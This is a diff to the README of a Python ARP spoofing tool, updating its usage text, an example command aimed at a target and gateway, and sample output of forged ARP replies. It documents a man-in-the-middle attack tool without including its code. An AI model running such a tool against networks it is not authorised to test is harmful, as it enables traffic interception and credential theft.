@@ -4,28 +4,29 @@ Python 3.9+ is required, tested on Kali Linux.
 ## Example Usage
 ```shell
 python3 arpspoof.py -h
-usage: spoof.py [-h] [--verbose] target gateway
+usage: spoof.py [-h] target gateway
 
 positional arguments:
-  target      Please specify target IP address
-  gateway     Please specify default gateway IP address
+  target      Please specify Target IP address
+  gateway     Please specify default Gateway IP address
+  interface   Please specity Interface.
 
 optional arguments:
   -h, --help  show this help message and exit
-  --verbose
 ```
 
 ```shell
-python3 arpspoof.py 192.168.0.17 192.168.0.1
+python3 arpspoof.py 192.168.0.17 192.168.0.1 wlan0
 ```
 
 Output
 ```
-[+] Enabling IP forwarding.
-[+] IP forwarding enabled.
-[+] Sent to 192.168.43.155 : 192.168.43.1 is at 00:0c:29:bf:00:3f
-[+] Sent to 192.168.43.1 : 192.168.43.155 is at 00:0c:29:bf:00:3f
-
+[*] Enabling IP forwarding.
+[*] Gateway 192.168.0.1 is at ac:22:05:4f:f9:1f
+[*] Target 192.168.0.17 is at a4:71:74:43:f9:0f
+[*] Prepare to send to 192.168.0.17: 192.168.0.1 is at 34:f6:4b:06:0c:f7
+[*] Prepare to send to 192.168.0.1: 192.168.0.17 is at 34:f6:4b:06:0c:f7
+[+] Beginning ARP Spoofing. [CTRL+C to stop]
 ```
 
 ## Disclaimer
